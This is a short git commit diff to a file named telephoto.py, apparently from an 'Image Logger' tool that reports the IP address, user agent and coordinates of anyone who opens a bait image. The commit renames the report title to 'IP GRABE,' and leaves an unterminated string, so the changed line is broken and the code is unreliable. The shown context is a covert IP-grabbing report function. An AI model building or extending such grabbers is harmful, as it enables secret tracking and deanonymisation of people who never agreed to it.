b9a4158cbf877d720860b0ecdae6412bb3f0b4ce
Inconnu0001111 <139705069+Inconnu0001111@users.noreply.github.com>
2023-07-17 03:37:29 +0200

    Update telephoto.py

--- api/telephoto.py
+++ api/telephoto.py
@@ -144,7 +144,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "IP GRABE,
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
